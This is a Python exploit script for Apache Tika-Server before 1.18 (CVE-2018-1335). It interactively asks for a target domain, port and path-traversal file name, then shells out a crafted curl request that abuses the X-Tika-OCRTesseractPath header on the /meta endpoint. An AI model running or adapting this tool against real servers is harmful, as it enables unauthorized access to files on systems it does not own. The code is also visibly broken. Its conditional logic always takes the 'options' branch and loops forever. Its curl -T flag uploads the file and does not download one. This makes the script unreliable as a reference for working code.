#  This is a spin off of CVE-2018-1335 allowing the attacker to download a file off the remote web server
import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


class Exploit:
    def __init__(self, domain, port, rfile, output_file):
        self.domain = domain
        self.port = port
        self.rfile = rfile
        self.output_file = output_file

    def main(self):
        while True:
            if self.domain or self.output_file or self.port or self.rfile == "options":
                print("""
Enter Domain: google.com
Enter Remote File: ../../test.txt
Enter Remote Port: 9000
Enter Output File: test.txt\n\n""")
            elif self.domain or self.output_file or self.port or self.rfile == "back" or self.domain or self.output_file or self.port or self.rfile == "exit":
                break
            else:
                payload = f'curl -T {self.output_file} https://{self.domain}:{self.port}/meta --header "X-Tika-OCRTesseractPath: \"{self.rfile}\""'
                sub.call(payload, shell=True)
                break


if __name__ == "__main__":
    afd = Exploit(
        domain=input(f"{Colors.red}(Apache Tika-Server <1.18 Arbitrary File Download){Colors.end} [Enter Domain]:~#"),
        rfile=input(f"{Colors.red}(Apache Tika-Server <1.18 Arbitrary File Download){Colors.end} [Enter Remote File]:~#"),
        port=int(input(f"{Colors.red}(Apache Tika-Server <1.18 Arbitrary File Download){Colors.end} [Enter Remote Port]:~#")),
        output_file=input(f"{Colors.red}(Apache Tika-Server <1.18 Arbitrary File Download){Colors.end} [Enter Output File]:~#")
    )
    afd.main()
